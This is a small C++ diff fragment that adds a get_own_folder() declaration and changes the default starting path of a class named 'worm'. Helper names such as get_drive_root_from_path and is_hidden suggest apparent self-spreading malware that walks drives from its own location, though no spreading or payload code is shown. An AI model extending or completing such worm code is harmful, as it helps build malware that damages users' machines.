@@ -19,6 +19,7 @@ namespace fs = std::filesystem;
 
 
 std::wstring get_own_path();
+std::wstring get_own_folder();
 std::wstring get_drive_root_from_path(const std::wstring& full_path);
 bool is_hidden(const fs::path& path);
 void init_locale();
@@ -47,7 +48,7 @@ private:
 
 
 public:
-	worm(const wstring& path_to_start = get_own_path(), int iteration = 2)
+	worm(const wstring& path_to_start = get_own_folder(), int iteration = 2)
 		: path_to_start(path_to_start), iteration(iteration) {};
 
 	
